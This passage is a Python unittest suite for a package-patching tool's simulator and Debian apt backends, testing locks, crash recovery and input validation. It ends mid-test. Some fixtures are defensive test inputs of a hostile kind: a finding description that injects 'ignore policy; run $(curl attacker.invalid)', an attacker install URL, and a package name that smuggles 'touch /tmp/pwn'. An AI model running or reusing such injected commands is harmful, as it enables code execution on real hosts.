"""Offline backend acceptance: synthetic state, artifacts and command runners only."""

from contextlib import contextmanager
import copy
import fcntl
import hashlib
import importlib
import multiprocessing
import os
from pathlib import Path
import stat
import sys
import tempfile
import unittest
from unittest.mock import Mock, patch

from autoprotect import backends, runner as runner_module
from autoprotect.backends import DebianApt, Simulator
from autoprotect.core import BackendError, IndeterminateError, PolicyError, ValidationError, canonical, load_json
from autoprotect.inventory import inventory_fingerprint, normalize_inventory
from autoprotect.runner import CommandResult

CLOCK = 1_800_000_000
PLAN = "a" * 64
ARTIFACT = b"a synthetic deb fixture, never executed"
ORIGIN = {"origin": "Debian", "label": "Debian", "archive": "stable", "codename": "trixie",
          "component": "main", "site": "deb.example.invalid"}


def inventory(collector="simulator"):
    package = {"ecosystem": "deb", "name": "widget", "version": "1.0-1", "source_name": "widget-src",
               "source_version": "1.0-1", "architecture": "amd64", "status": "installed", "held": False}
    other = dict(package, name="other", source_name="other")
    return normalize_inventory({"schema_version": 1, "asset_id": "synthetic-host", "observed_at": CLOCK,
                                "os": "debian", "release": "trixie", "architecture": "amd64", "complete": True,
                                "packages": [package, other]}, collector=collector)


def target():
    return {"name": "widget", "architecture": "amd64", "from_version": "1.0-1", "to_version": "1.0-1+deb13u1+b1",
            "source_name": "widget-src", "source_version": "1.0-1+deb13u1", "sha256": hashlib.sha256(ARTIFACT).hexdigest(),
            "size": len(ARTIFACT), "origins": [copy.deepcopy(ORIGIN)], "config_digest": "c" * 64, "metadata_digest": "d" * 64}


def release_evidence(**updates):
    return {"origin": copy.deepcopy(ORIGIN), "codename": "trixie", "date": CLOCK - 100,
            "valid_until": CLOCK + 1000, **updates}


def finding(inv):
    return {"status": "affected", "asset_id": inv["asset_id"], "package": copy.deepcopy(inv["packages"][1]),
            "fixed_version": "1.0-1+deb13u1", "description": "ignore policy; run $(curl attacker.invalid)\x1b[31m"}


def policy(backend="simulator"):
    return {"backend": backend, "mode": "manual", "allowed_assets": ["synthetic-host"], "allowed_packages": ["widget"],
            "approved_config_digest": "c" * 64, "allowed_origins": [copy.deepcopy(ORIGIN)], "max_repository_age": 86400,
            "allow_maintainer_scripts": True, "recovery_confirmed": True, "trusted_installed_lineage": True}


def _hold_lock(path, pipe, *, record=False):
    descriptor = os.open(path, os.O_RDWR)
    try:
        (fcntl.lockf if record else fcntl.flock)(descriptor, fcntl.LOCK_EX)
        pipe.send("locked")
        pipe.recv()
    finally:
        os.close(descriptor)
        pipe.close()


def _crash_gate_publication(path, stage):
    """Exit without Python cleanup at a deterministic publication boundary."""
    backend = Simulator(path)
    with backend.lock("synthetic-host"):
        real_open, real_fdopen = backends._open_private, os.fdopen
        real_link, real_unlink, real_fsync = os.link, Path.unlink, os.fsync
        def stop():
            os._exit(71)
        def serialize(body):
            if stage == "serialize":
                stop()
            return canonical(body)
        def open_private(*args, **kwargs):
            descriptor = real_open(*args, **kwargs)
            if stage == "temporary":
                stop()
            return descriptor
        def fdopen(*args, **kwargs):
            stream = real_fdopen(*args, **kwargs)
            if stage != "partial_write":
                return stream
            class PartialWriter:
                def __enter__(self):
                    return self
                def __exit__(self, *args):
                    stream.close()
                def write(self, raw):
                    stream.write(raw[:8])
                    stream.flush()
                    stop()
            return PartialWriter()
        def sync(descriptor):
            directory = stat.S_ISDIR(os.fstat(descriptor).st_mode)
            if stage == ("directory_sync" if directory else "file_sync"):
                stop()
            real_fsync(descriptor)
            if stage == ("directory_synced" if directory else "file_synced"):
                stop()
        def link(*args, **kwargs):
            if stage == "before_link":
                stop()
            real_link(*args, **kwargs)
            if stage == "after_link":
                stop()
        def unlink(path, *args, **kwargs):
            if stage == "before_unlink":
                stop()
            real_unlink(path, *args, **kwargs)
            if stage == "after_unlink":
                stop()
        with patch.object(backends, "canonical", side_effect=serialize), \
                patch.object(backends, "_open_private", side_effect=open_private), \
                patch.object(backends.os, "fdopen", side_effect=fdopen), \
                patch.object(backends.os, "fsync", side_effect=sync), \
                patch.object(backends.os, "link", side_effect=link), patch.object(Path, "unlink", unlink):
            backend.begin(PLAN)
            stop()


def _crash_recovery_resolution(path, stage):
    backend = Simulator(path)
    with backend.lock("synthetic-host", recovery=True):
        real_replace, real_fsync, real_unlink = os.replace, os.fsync, Path.unlink
        def stop():
            os._exit(72)
        def replace(source, destination):
            if stage == "before_generation":
                stop()
            real_replace(source, destination)
            if stage == "after_generation":
                stop()
        def sync(descriptor):
            directory = stat.S_ISDIR(os.fstat(descriptor).st_mode)
            if directory and stage == "before_generation_sync":
                stop()
            real_fsync(descriptor)
            if directory and stage == "after_generation_sync":
                stop()
        def unlink(path, *args, **kwargs):
            if path == backend._gate_path and stage == "before_gate_removal":
                stop()
            real_unlink(path, *args, **kwargs)
            if path == backend._gate_path and stage == "after_gate_removal":
                stop()
        with patch.object(backends.os, "replace", side_effect=replace), \
                patch.object(backends.os, "fsync", side_effect=sync), patch.object(Path, "unlink", unlink):
            backend.clear_gate(PLAN, "Synthetic recovery crash")


class SimulatorTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.path = Path(self.temp.name) / "sim.json"
        self.clock = patch.object(backends, "now", return_value=CLOCK)
        self.clock.start()
        self.addCleanup(self.clock.stop)
        self.backend = Simulator.initialize(self.path, inventory(), [target()])

    def test_initialize_is_exclusive_private_and_forces_collector(self):
        self.assertEqual(self.path.stat().st_mode & 0o777, 0o600)
        with self.assertRaises(FileExistsError):
            Simulator.initialize(self.path, inventory(), [target()])
        second = self.path.parent / "second.json"
        backend = Simulator.initialize(second, inventory("native"), [target()])
        self.assertEqual(backend.inspect()["collector"], "simulator")

    def test_simulator_cannot_skip_invalid_or_unsafe_ancestors(self):
        root = self.path.parent
        (root / "child").mkdir(mode=0o700)
        (root / "link").symlink_to(root / "child", target_is_directory=True)
        (root / "ordinary").touch(mode=0o600)
        (root / "public").mkdir(mode=0o777)
        (root / "public").chmod(0o777)
        for ancestor in ("link", "missing", "ordinary", "public"):
            with self.subTest(ancestor=ancestor, operation="open"):
                with self.assertRaises((BackendError, ValidationError, OSError)):
                    Simulator(root / ancestor / ".." / self.path.name)
            with self.subTest(ancestor=ancestor, operation="create"):
                target_path = root / (ancestor + ".json")
                with self.assertRaises((BackendError, ValidationError, OSError)):
                    Simulator.initialize(root / ancestor / ".." / target_path.name, inventory(), [target()])
                self.assertFalse(target_path.exists())
        private = root / "public" / "private"
        private.mkdir(mode=0o700)
        with self.assertRaises((BackendError, ValidationError, OSError)):
            Simulator.initialize(private / "sim.json", inventory(), [target()])
        self.assertFalse((private / "sim.json").exists())

    def test_simulator_allows_valid_checked_parent_traversal(self):
        child = self.path.parent / "child"
        child.mkdir(mode=0o700)
        self.assertEqual(Simulator(child / ".." / self.path.name).path, self.path)
        created = Simulator.initialize(child / ".." / "second.json", inventory(), [target()])
        self.assertEqual(created.path, self.path.parent / "second.json")

    def test_gate_serialization_interrupt_never_publishes_empty_gate(self):
        with self.backend.lock("synthetic-host"):
            with patch.object(backends, "canonical", side_effect=KeyboardInterrupt):
                with self.assertRaises(KeyboardInterrupt):
                    self.backend.begin(PLAN)
            self.assertFalse(self.backend._gate_path.exists())
        with self.backend.lock("synthetic-host", recovery=True) as gate:
            self.assertIsNone(gate)

    def test_simulator_coordination_names_cannot_be_states(self):
        for name in ("sim.json.lock", "sim.json.gate", "sim.json.generation", ".state-private", ".publish-private"):
            path = self.path.parent / name
            with self.subTest(name=name, operation="initialize"):
                with self.assertRaises(ValidationError):
                    Simulator.initialize(path, inventory(), [target()])
                self.assertFalse(path.exists())
            # Even a legacy coordination file containing valid simulator JSON
            # must not open as another state and replace a held lock inode.
            path.write_bytes(self.path.read_bytes())
            path.chmod(0o600)
            with self.subTest(name=name, operation="open"), self.assertRaises(ValidationError):
                Simulator(path)
            path.unlink()

    def test_gate_crashes_leave_no_gate_or_complete_recoverable_gate(self):
        stages = ("serialize", "temporary", "partial_write", "file_sync", "file_synced", "before_link",
                  "after_link", "before_unlink", "after_unlink", "directory_sync", "directory_synced", "completed")
        for stage in stages:
            with self.subTest(stage=stage):
                process = multiprocessing.Process(target=_crash_gate_publication, args=(str(self.path), stage))
                process.start()
                process.join(5)
                if process.is_alive():
                    process.kill()
                    process.join(3)
                self.assertEqual(process.exitcode, 71)
                backend = Simulator(self.path)
                self.assertEqual(backend.inspect(), inventory())
                if backend._gate_path.exists():
                    self.assertEqual(load_json(backend._gate_path.read_bytes()), {"plan_id": PLAN})
                    if stage in ("after_link", "before_unlink"):
                        self.assertEqual(backend._gate_path.stat().st_nlink, 2)
                    with self.assertRaises(BackendError), backend.lock("synthetic-host"):
                        pass
                with backend.lock("synthetic-host", recovery=True) as gate:
                    if stage in stages[:6]:
                        self.assertIsNone(gate)
                    else:
                        self.assertEqual(gate, {"plan_id": PLAN})
                        backend.clear_gate(PLAN, "Synthetic publication crash inspected")
                self.assertFalse(backend._gate_path.exists())
                self.assertFalse(backends._publication_path(backend._gate_path).exists())

    def test_gate_interrupted_alias_cleanup_is_recoverable_without_mutation(self):
        temporary = backends._publication_path(self.backend._gate_path)
        unlink = Path.unlink
        def interrupt(path, *args, **kwargs):
            if path == temporary:
                raise KeyboardInterrupt
            return unlink(path, *args, **kwargs)
        with self.backend.lock("synthetic-host"):
            with patch.object(Path, "unlink", interrupt), self.assertRaises(KeyboardInterrupt):
                self.backend.begin(PLAN)
            self.assertEqual(self.backend._gate_path.stat().st_nlink, 2)
            with self.assertRaises(BackendError):
                self.backend.apply(target(), policy(), before_mutation=lambda: None)
        with Simulator(self.path).lock("synthetic-host", recovery=True) as gate:
            self.assertEqual(gate, {"plan_id": PLAN})
        with self.backend.lock("synthetic-host", recovery=True):
            self.backend.clear_gate(PLAN, "Complete two-link publication inspected")
        self.assertFalse(temporary.exists())

    def test_gate_publication_cannot_overwrite_and_failed_fsync_cannot_authorize(self):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            original = self.backend._gate_path.read_bytes()
            with self.assertRaises(FileExistsError):
                backends._exclusive_json(self.backend._gate_path, {"plan_id": "b" * 64})
            self.assertEqual(self.backend._gate_path.read_bytes(), original)
            self.backend.finish(PLAN, "failed")
        for error in (OSError("synthetic fsync failure"), KeyboardInterrupt()):
            with self.subTest(error=type(error).__name__):
                with self.backend.lock("synthetic-host"):
                    with patch.object(backends, "_sync_directory", side_effect=error):
                        with self.assertRaises(KeyboardInterrupt if isinstance(error, KeyboardInterrupt) else IndeterminateError):
                            self.backend.begin(PLAN)
                    with self.assertRaises(BackendError):
                        self.backend.apply(target(), policy(), before_mutation=lambda: None)
                with self.backend.lock("synthetic-host", recovery=True):
                    self.backend.clear_gate(PLAN, "Publication durability failure inspected")
        self.assertEqual(self.backend.inspect(), inventory())

    def test_failed_republication_under_same_lock_cannot_reuse_old_durable_flag(self):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            self.backend.finish(PLAN, "failed")
            with patch.object(backends, "_sync_directory", side_effect=OSError("synthetic failure")), self.assertRaises(IndeterminateError):
                self.backend.begin(PLAN)
            with self.assertRaises(BackendError):
                self.backend.apply(target(), policy(), before_mutation=lambda: None)
        self.assertEqual(self.backend.inspect(), inventory())

    def test_legacy_state_in_lock_path_cannot_replace_active_lock_inode(self):
        # Reproduce the older accepted sim.json.lock state without asking the
        # repaired initializer to create it. Its bytes are irrelevant to flock.
        self.backend._lock_path.write_bytes(self.path.read_bytes())
        self.backend._lock_path.chmod(0o600)
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            inode = self.backend._lock_path.stat().st_ino
            with self.assertRaises(ValidationError):
                Simulator(self.backend._lock_path).set_failure(None)
            self.assertEqual(self.backend._lock_path.stat().st_ino, inode)
            with self.assertRaises(BackendError), Simulator(self.path).lock("synthetic-host", recovery=True):
                pass
            self.assertEqual(self.backend._gate(), {"plan_id": PLAN})

    def test_generation_rotates_only_for_explicit_resolution_across_instances(self):
        self.assertEqual(self.backend.generation(), "0" * 64)
        for outcome in ("succeeded", "failed"):
            with self.backend.lock("synthetic-host"):
                self.backend.begin(PLAN)
                self.backend.finish(PLAN, outcome)
            self.assertEqual(self.backend.generation(), "0" * 64)
            self.assertFalse(self.backend._generation_path.exists())
        tokens = {self.backend.generation()}
        for _ in range(2):
            with self.backend.lock("synthetic-host"):
                self.backend.begin(PLAN)
            other = Simulator(self.path)
            with other.lock("synthetic-host", recovery=True):
                other.clear_gate(PLAN, "Synthetic recovery with unchanged clock")
            token = self.backend.generation()
            self.assertRegex(token, r"^[0-9a-f]{64}$")
            self.assertNotIn(token, tokens)
            tokens.add(token)
            self.assertEqual(Simulator(self.path).generation(), token)
            self.assertEqual(self.backend._generation_path.stat().st_mode & 0o777, 0o600)

    def test_wrong_or_absent_gate_and_overrides_cannot_rotate_generation(self):
        with self.backend.lock("synthetic-host", recovery=True):
            with self.assertRaises(BackendError):
                self.backend.clear_gate(PLAN, "Absent gate")
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        raw_digest = hashlib.sha256(self.backend._gate_path.read_bytes()).hexdigest()
        with self.backend.lock("synthetic-host", recovery=True):
            for plan, override in (("b" * 64, None), (PLAN, raw_digest), ("b" * 64, raw_digest)):
                with self.subTest(plan=plan, override=override), self.assertRaises(BackendError):
                    self.backend.clear_gate(plan, "Must not override a valid gate", malformed_digest=override)
            self.assertEqual(self.backend.generation(), "0" * 64)
            self.assertEqual(self.backend._gate(), {"plan_id": PLAN})
        self.assertFalse(self.backend._generation_path.exists())

    def test_bounded_malformed_gates_need_exact_current_digest(self):
        for raw in (b"", b"{", b'{"plan_id":"wrong"}', b'{"plan_id":"x","plan_id":"y"}', b"\xff\x00secret"):
            with self.subTest(raw=raw):
                self.backend._gate_path.write_bytes(raw)
                self.backend._gate_path.chmod(0o600)
                token = self.backend.generation()
                expected = {"malformed": True, "digest": hashlib.sha256(raw).hexdigest()}
                with self.assertRaises(BackendError), self.backend.lock("synthetic-host"):
                    pass
                with self.backend.lock("synthetic-host", recovery=True) as gate:
                    self.assertEqual(gate, expected)
                    for override in (None, "b" * 64):
                        with self.assertRaises(BackendError):
                            self.backend.clear_gate(PLAN, "Malformed synthetic gate", malformed_digest=override)
                    self.assertEqual(self.backend.generation(), token)
                    self.backend.clear_gate(PLAN, "Explicit digest-based attestation", malformed_digest=gate["digest"])
                self.assertNotEqual(self.backend.generation(), token)
                self.assertFalse(self.backend._gate_path.exists())

    def test_malformed_digest_changes_are_not_silently_accepted(self):
        self.backend._gate_path.write_bytes(b"old invalid")
        self.backend._gate_path.chmod(0o600)
        with self.backend.lock("synthetic-host", recovery=True) as gate:
            self.backend._gate_path.write_bytes(b"new invalid")
            with self.assertRaises(BackendError):
                self.backend.clear_gate(PLAN, "Stale malformed evidence", malformed_digest=gate["digest"])
            self.assertEqual(self.backend.generation(), "0" * 64)

    def test_gate_unsafe_objects_fail_closed_even_with_recovery_override(self):
        gate = self.backend._gate_path
        unsafe = self.path.parent / "unsafe"
        unsafe.write_bytes(b"untrusted secret")
        unsafe.chmod(0o600)
        creators = (lambda: gate.symlink_to(unsafe), lambda: os.mkfifo(gate, 0o600),
                    lambda: gate.mkdir(mode=0o700), lambda: os.link(unsafe, gate),
                    lambda: (gate.write_bytes(b"x" * 4097), gate.chmod(0o600)),
                    lambda: (gate.write_bytes(b"private"), gate.chmod(0o644)))
        for create in creators:
            create()
            for recovery in (False, True):
                with self.subTest(create=create, recovery=recovery), self.assertRaises(BackendError) as caught:
                    with self.backend.lock("synthetic-host", recovery=recovery):
                        pass
                self.assertNotIn("untrusted secret", str(caught.exception))
                self.assertLess(len(str(caught.exception)), 200)
            if gate.is_dir() and not gate.is_symlink():
                gate.rmdir()
            else:
                gate.unlink()
        self.assertEqual(self.backend.generation(), "0" * 64)

    def test_generation_persists_before_gate_removal_and_failures_retain_gate(self):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        unlink = Path.unlink
        events = []
        real_sync = backends._sync_directory
        def sync(path):
            real_sync(path)
            if self.backend._generation_path.exists():
                events.append("generation-flushed")
        def remove(path, *args, **kwargs):
            if path == self.backend._gate_path:
                self.assertIn("generation-flushed", events)
                self.assertNotEqual(self.backend.generation(), "0" * 64)
                events.append("gate-removed")
            return unlink(path, *args, **kwargs)
        with self.backend.lock("synthetic-host", recovery=True), patch.object(backends, "_sync_directory", side_effect=sync), \
                patch.object(Path, "unlink", remove):
            self.backend.clear_gate(PLAN, "Ordering assertion")
        self.assertLess(events.index("generation-flushed"), events.index("gate-removed"))
        previous = self.backend.generation()
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        with self.backend.lock("synthetic-host", recovery=True):
            with patch.object(backends, "_atomic_json", side_effect=OSError("synthetic failure")), self.assertRaises(IndeterminateError):
                self.backend.clear_gate(PLAN, "Must retain gate")
            self.assertEqual(self.backend.generation(), previous)
            self.assertEqual(self.backend._gate(), {"plan_id": PLAN})
            with patch.object(backends, "_sync_directory", side_effect=KeyboardInterrupt), self.assertRaises(KeyboardInterrupt):
                self.backend.clear_gate(PLAN, "Interrupted generation directory flush")
            self.assertEqual(self.backend._gate(), {"plan_id": PLAN})
            self.assertNotEqual(self.backend.generation(), previous)

    def test_recovery_crashes_never_clear_gate_with_old_generation(self):
        stages = ("before_generation", "after_generation", "before_generation_sync", "after_generation_sync",
                  "before_gate_removal", "after_gate_removal")
        for stage in stages:
            with self.subTest(stage=stage):
                previous = self.backend.generation()
                with self.backend.lock("synthetic-host"):
                    self.backend.begin(PLAN)
                process = multiprocessing.Process(target=_crash_recovery_resolution, args=(str(self.path), stage))
                process.start()
                process.join(5)
                if process.is_alive():
                    process.kill()
                    process.join(3)
                self.assertEqual(process.exitcode, 72)
                current = Simulator(self.path).generation()
                if stage == "before_generation":
                    self.assertEqual(current, previous)
                else:
                    self.assertNotEqual(current, previous)
                if stage == "after_gate_removal":
                    self.assertFalse(self.backend._gate_path.exists())
                else:
                    with self.backend.lock("synthetic-host", recovery=True) as gate:
                        self.assertEqual(gate, {"plan_id": PLAN})
                        self.backend.clear_gate(PLAN, "Finish synthetic interrupted recovery")

    def test_generation_malformed_or_unsafe_record_blocks_resolution(self):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
        for raw in (b"", b"[]", b'{"generation":"bad"}', b"x" * 257):
            self.backend._generation_path.write_bytes(raw)
            self.backend._generation_path.chmod(0o600)
            with self.subTest(raw=raw), self.assertRaises(BackendError):
                self.backend.generation()
            with self.backend.lock("synthetic-host", recovery=True), self.assertRaises(BackendError):
                self.backend.clear_gate(PLAN, "Cannot discard malformed generation state")
            self.assertTrue(self.backend._gate_path.exists())
        self.backend._generation_path.unlink()
        self.backend._generation_path.symlink_to(self.path)
        with self.assertRaises(BackendError):
            self.backend.generation()

    def test_manual_and_auto_update_only_expected_fields(self):
        for mode in ("manual", "auto"):
            with self.subTest(mode=mode):
                path = self.path.parent / (mode + ".json")
                backend = Simulator.initialize(path, inventory(), [target()])
                pol = dict(policy(), mode=mode)
                before = backend.inspect()
                resolved = backend.resolve(before, finding(before), pol)
                callback = Mock()
                with backend.lock(before["asset_id"]):
                    backend.begin(PLAN)
                    result = backend.apply(resolved, pol, before_mutation=callback)
                    self.assertTrue(backend._gate_path.exists())  # Engine must commit first.
                    backend.finish(PLAN, "succeeded")
                callback.assert_called_once_with()
                self.assertTrue(result["synthetic"])
                expected = backends._replacement(before, resolved)
                self.assertEqual(backend.inspect(), expected)
                with self.assertRaises(BackendError):
                    backend.resolve(expected, finding(before), pol)

    def test_callback_occurs_after_gate_and_before_write(self):
        before = self.backend.inspect()
        def callback():
            self.assertEqual(self.backend.inspect(), before)
            self.assertEqual(load_json(self.backend._gate_path.read_bytes()), {"plan_id": PLAN})
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            self.backend.apply(target(), policy(), before_mutation=callback)

    def test_before_write_confirmed_failure_can_clear_gate(self):
        self.backend.set_failure("before_write")
        before = self.backend.inspect()
        callback = Mock()
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            with self.assertRaises(BackendError):
                self.backend.apply(target(), policy(), before_mutation=callback)
            self.backend.finish(PLAN, "failed")
        self.assertEqual(before, self.backend.inspect())
        callback.assert_not_called()
        self.assertFalse(self.backend._gate_path.exists())

    def test_after_write_is_indeterminate_and_persists_across_instances(self):
        self.backend.set_failure("after_write")
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            with self.assertRaises(IndeterminateError):
                self.backend.apply(target(), policy(), before_mutation=lambda: None)
            self.backend.finish(PLAN, "needs_attention")
        replacement = Simulator(self.path)
        self.assertEqual(replacement.inspect()["packages"][1]["version"], target()["to_version"])
        with self.assertRaises(BackendError), replacement.lock("synthetic-host"):
            pass
        with self.assertRaises(BackendError):
            replacement.set_failure(None)
        with replacement.lock("synthetic-host", recovery=True):
            with self.assertRaises(BackendError):
                replacement.clear_gate("b" * 64, "inspected")
            with self.assertRaises(ValidationError):
                replacement.clear_gate(PLAN, " ")
            replacement.clear_gate(PLAN, "Disposable result inspected; no rollback attempted")
        replacement.set_failure(None)
        self.assertEqual(replacement.inspect()["packages"][1]["version"], target()["to_version"])

    def test_gates_survive_exit_before_mutation_and_reject_wrong_context(self):
        with self.assertRaises(BackendError):
            self.backend.begin(PLAN)
        with self.backend.lock("synthetic-host"):
            with self.assertRaises(BackendError):
                self.backend.apply(target(), policy(), before_mutation=lambda: None)
            self.backend.begin(PLAN)
            with self.assertRaises(BackendError):
                self.backend.clear_gate(PLAN, "not a recovery lock")
        other = Simulator(self.path)
        with other.lock("synthetic-host", recovery=True) as gate:
            self.assertEqual(gate, {"plan_id": PLAN})
            with self.assertRaises(BackendError):
                other.begin("b" * 64)
            other.clear_gate(PLAN, "No mutation occurred before the recorded crash")

    def test_gate_fsync_precedes_return_and_failure_retains_gate(self):
        with self.backend.lock("synthetic-host"):
            real_sync = os.fsync
            events = []
            def sync(fd):
                events.append(os.fstat(fd).st_mode)
                real_sync(fd)
            with patch.object(backends.os, "fsync", side_effect=sync):
                self.backend.begin(PLAN)
            self.assertEqual(len(events), 2)
            self.backend.finish(PLAN, "failed")
            with patch.object(backends, "_sync_directory", side_effect=OSError("synthetic sync error")):
                with self.assertRaises(IndeterminateError):
                    self.backend.begin(PLAN)
            self.assertTrue(self.backend._gate_path.exists())

    def test_callback_denial_and_interrupt_do_not_write(self):
        for error in (PolicyError("expired"), KeyboardInterrupt()):
            with self.subTest(error=type(error).__name__):
                before = self.backend.inspect()
                with self.backend.lock("synthetic-host"):
                    self.backend.begin(PLAN)
                    with self.assertRaises(type(error)):
                        self.backend.apply(target(), policy(), before_mutation=Mock(side_effect=error))
                    self.assertEqual(before, self.backend.inspect())
                    self.assertTrue(self.backend._gate_path.exists())
                    self.backend.finish(PLAN, "failed")

    def test_write_failure_and_interrupt_retain_gate(self):
        for error in (OSError("uncertain rename"), KeyboardInterrupt()):
            with self.subTest(error=type(error).__name__):
                with self.backend.lock("synthetic-host"):
                    self.backend.begin(PLAN)
                    with patch.object(backends, "_atomic_json", side_effect=error):
                        with self.assertRaises(KeyboardInterrupt if isinstance(error, KeyboardInterrupt) else IndeterminateError):
                            self.backend.apply(target(), policy(), before_mutation=lambda: None)
                with self.backend.lock("synthetic-host", recovery=True):
                    self.backend.clear_gate(PLAN, "Synthetic interrupted write inspected")

    def test_lock_contention_across_instances_and_processes(self):
        other = Simulator(self.path)
        with self.backend.lock("synthetic-host"):
            with self.assertRaises(BackendError), other.lock("synthetic-host"):
                pass
            with self.assertRaises(BackendError), self.backend.lock("synthetic-host"):
                pass
        parent, child = multiprocessing.Pipe()
        process = multiprocessing.Process(target=_hold_lock, args=(str(self.backend._lock_path), child))
        process.start()
        try:
            self.assertTrue(parent.poll(3))
            self.assertEqual(parent.recv(), "locked")
            with self.assertRaises(BackendError), other.lock("synthetic-host"):
                pass
        finally:
            parent.send("done")
            process.join(3)
            if process.is_alive():
                process.kill()
                process.join(3)
            parent.close()
            child.close()
        self.assertEqual(process.exitcode, 0)

    def test_foreign_asset_and_observe_policy_rejected(self):
        with self.assertRaises(BackendError), self.backend.lock("another-host"):
            pass
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            with self.assertRaises(PolicyError):
                self.backend.apply(target(), dict(policy(), mode="observe"), before_mutation=lambda: None)

    def test_target_schema_and_catalog_ambiguity(self):
        for change in ({"url": "https://attacker.invalid/install"}, {"name": "widget;touch /tmp/pwn"},
                       {"to_version": "1.0-1"}, {"sha256": "X" * 64}, {"size": True},
                       {"size": backends.MAX_ARTIFACT_BYTES + 1}):
            with self.subTest(change=change), self.assertRaises((ValidationError, BackendError)):
                Simulator.initialize(self.path.parent / "invalid.json", inventory(), [dict(target(), **change)])
        ambiguous = dict(target(), sha256="f" * 64)
        backend = Simulator.initialize(self.path.parent / "ambiguous.json", inventory(), [target(), ambiguous])
        with self.assertRaisesRegex(BackendError, "ambiguous"):
            backend.resolve(backend.inspect(), finding(backend.inspect()), policy())

    def test_reject_invalid_failure_modes_and_unsafe_state_paths(self):
        with self.assertRaises(ValidationError):
            self.backend.set_failure("native-command")
        self.path.chmod(0o644)
        with self.assertRaises(BackendError):
            Simulator(self.path)
        self.path.chmod(0o600)
        link = self.path.parent / "link.json"
        link.symlink_to(self.path)
        with self.assertRaises(OSError):
            Simulator(link)
        os.link(self.path, self.path.parent / "hardlink.json")
        with self.assertRaises(BackendError):
            Simulator(self.path)

    def test_catalog_and_inspection_are_independent_copies(self):
        inv = self.backend.inspect()
        resolved = self.backend.resolve(inv, finding(inv), policy())
        resolved["origins"][0]["site"] = "changed.invalid"
        inv["packages"].clear()
        self.assertEqual(self.backend.inspect(), inventory())
        self.assertEqual(self.backend.resolve(inventory(), finding(inventory()), policy()), target())

    def test_platform_held_and_broken_state_remain_nonexecutable(self):
        for mutate in (lambda i: i.update(os="ubuntu"), lambda i: i.update(complete=False),
                       lambda i: i["packages"][1].update(held=True),
                       lambda i: i["packages"][0].update(status="half-configured")):
            inv = inventory()
            mutate(inv)
            with self.assertRaises(BackendError):
                self.backend.resolve(inv, finding(inv), policy())


class FakeNativeRunner:
    def __init__(self):
        self.inventory = inventory("native")
        self.target = target()
        self.events = []
        self.commands = []
        self.frontend = False
        self.download_bytes = ARTIFACT
        self.download_extra = False
        self.download_symlink = False
        self.probe_failure = None
        self.install_failure = None
        self.install_status = 0
        self.post_mutation = None
        self.after_download = None
        self.simulation = None
        self.evidence = {"target": self.target, "authenticated": True, "essential": False,
                         "relationships": {"Conflicts": "", "Breaks": "", "Replaces": ""},
                         "releases": [release_evidence()]}
        self.artifact = {"name": "widget", "architecture": "amd64", "version": self.target["to_version"],
                         "source_name": "widget-src", "source_version": self.target["source_version"],
                         "relationships": {"Conflicts": "", "Breaks": "", "Replaces": ""}, "essential": False}

    @contextmanager
    def dpkg_frontend_lock(self):
        assert not self.frontend
        self.frontend = True
        self.events.append("lock")
        try:
            yield self
        finally:
            self.events.append("unlock")
            self.frontend = False

    def run(self, argv, *, timeout=60, cwd=None):
        self.commands.append((list(argv), timeout, cwd, self.frontend))
        if argv[0] == "/usr/bin/python3":
            action = argv[3]
            self.events.append(action)
            if self.probe_failure:
                raise self.probe_failure
            if action == "resolve":
                return CommandResult(0, canonical(self.evidence), "")
            if action == "download":
                assert self.frontend
                destination = Path(argv[-1]) / "package.deb"
                destination.write_bytes(self.download_bytes)
                destination.chmod(0o600)
                if self.download_extra:
                    (destination.parent / "extra.deb").write_bytes(b"extra")
                if self.download_symlink:
                    destination.rename(destination.with_name("actual.deb"))
                    destination.symlink_to("actual.deb")
                if self.after_download:
                    self.after_download()
                return CommandResult(0, '{"downloaded":true}', "")
            if action == "artifact":
                return CommandResult(0, canonical(self.artifact), "")
        if argv[0] == "/usr/bin/apt-get":
            self.events.append("simulate")
            output = (f"Reading package lists...\nInst widget [1.0-1] ({self.target['to_version']} Debian:stable [amd64])\n"
                      f"Conf widget ({self.target['to_version']} Debian:stable [amd64])\n")
            return CommandResult(0, self.simulation if self.simulation is not None else output, "")
        if argv[0] == "/usr/bin/dpkg" and "--install" in argv:
            assert self.frontend
            assert Path(argv[-1]).read_bytes() == ARTIFACT
            self.events.append("install")
            if self.install_failure:
                raise self.install_failure
            self.inventory = backends._replacement(self.inventory, self.target)
            if self.post_mutation:
                self.post_mutation(self.inventory)
            return CommandResult(self.install_status, "", "")
        raise AssertionError("unexpected native command: " + repr(argv))


class DebianAptTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.runner = FakeNativeRunner()
        self.state = self.root / "autoprotect" / "targets"
        self.database_lock = self.root / "database-lock"
        self.database_lock.touch(mode=0o600)
        for patcher in (patch.object(backends, "_NATIVE_STATE", self.state),
                        patch.object(backends, "_DATABASE_LOCK", self.database_lock),
                        patch.object(backends, "now", return_value=CLOCK),
                        patch.object(backends, "collect_local", side_effect=lambda runner: copy.deepcopy(runner.inventory)),
                        patch.object(DebianApt, "_live", autospec=True)):
            patcher.start()
            self.addCleanup(patcher.stop)
        self.backend = DebianApt(self.runner, live=True)
        self.pol = policy("debian-apt")

    def resolve(self):
        inv = self.backend.inspect()
        return self.backend.resolve(inv, finding(inv), self.pol)

    def execute(self, callback=lambda: None):
        with self.backend.lock("synthetic-host"):
            self.backend.begin(PLAN)
            return self.backend.apply(target(), self.pol, before_mutation=callback)

    def test_native_success_fixed_arguments_and_frontend_interval(self):
        self.assertEqual(self.resolve(), target())
        self.runner.commands.clear()
        self.runner.events.clear()
        def callback():
            self.runner.events.append("callback")
            self.assertTrue(self.runner.frontend)
